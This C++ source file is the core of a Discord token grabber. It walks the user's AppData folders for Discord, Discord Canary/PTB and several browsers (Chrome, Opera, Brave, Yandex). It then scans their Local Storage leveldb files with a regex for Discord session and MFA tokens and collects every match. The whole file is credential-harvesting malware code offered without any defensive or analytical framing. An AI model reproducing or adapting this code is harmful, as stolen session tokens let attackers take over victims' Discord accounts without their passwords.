#include "Tokens.h"
#include <array>
#include <filesystem>
#include <iostream>
#include <fstream>
#include <regex>

namespace fs = std::filesystem;
//possible paths for where tokens could be
constexpr std::array<const char*, 7> paths = {
	"\\Discord",
	"\\discordcanary",
	"\\discordptb",
	"\\Google\\Chrome\\User Data\\Default",
	"\\Opera Software\\Opera Stable",
	"\\BraveSoftware\\Brave-Browser\\User Data\\Default",
	"\\Yandex\\YandexBrowser\\User Data\\Default"
};
const char * localStorage = "\\Local Storage\\leveldb\\";

//load file
std::string loadFile(fs::path path) {
	std::ifstream ifs(path.c_str(), std::ios::in | std::ios::binary | std::ios::ate);

	std::ifstream::pos_type fileSize = ifs.tellg();
	ifs.seekg(0, std::ios::beg);
	std::string fileContents;
	fileContents.resize(fileSize);
	ifs.read(&fileContents.data()[0], fileSize);
	return fileContents;
}

//easy vector functions
template<typename T>
std::vector<T> operator+(std::vector<T> const& first, std::vector<T> const& second) {
	std::vector<T> result(first.begin(), first.end());
	result.insert(result.begin(),second.begin(), second.end());
	return result;
}
template<typename T>
void printVector(std::vector<T> vec){
	std::cout << "Vector Size: " << vec.size() << std::endl;
	for (auto& value : vec) std::cout << value << std::endl;
}

//finding paths
std::vector<fs::path> getSubPaths(fs::path path) {
	std::vector<fs::path> result;
	for (auto& de : fs::directory_iterator(path)) {
		result.push_back(de.path());
	}
	return result;
}
std::vector<fs::path> getFilesWithType(fs::path base_path, std::string const& filetype) {
	std::vector<fs::path> result;
	for (auto& de : fs::directory_iterator(base_path)) {
		auto path = de.path();
		if (path.has_extension() && path.extension() == filetype) {
			result.push_back(path);
		}
	}
	return result;
}
void removeInvalidPaths(std::vector<fs::path>& paths) {
	for (auto it = paths.begin(); it != paths.end(); it++) {
		if (!fs::exists(*it)) {
			paths.erase(it);
			it--;
		}
	}
}

std::vector<std::string> getTokensInPath(fs::path path) {
	auto files = getFilesWithType(path, ".ldb") + getFilesWithType(path, ".log");

	std::vector<std::string> tokens;
	for (auto& file : files) {

		std::string content = loadFile(file);
		std::regex token_pattern(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[a-zA-Z0-9_\-]{84})");
		std::smatch match;

		while (std::regex_search(content, match, token_pattern)) {
			tokens.push_back(match.str(0));
			content = match.suffix().str();
		}
	}
	return tokens;
}

std::vector<std::string> getTokens()
{
	auto appdata_paths = getSubPaths(fs::path(getenv("APPDATA")).parent_path());
	std::vector<fs::path> all_paths;

	//combine all possible filepaths
	for (auto& appdata_path : appdata_paths) {
		for (auto& path : paths) {
			all_paths.push_back(appdata_path.string() + path + localStorage);
		}
	}
	removeInvalidPaths(all_paths);

	//for each valid path get tokens
	std::vector<std::string> result;
	for (auto& path : all_paths) {
		auto tokens = getTokensInPath(path);
		result.insert(result.end(), tokens.begin(), tokens.end());
	}

	return result;
}
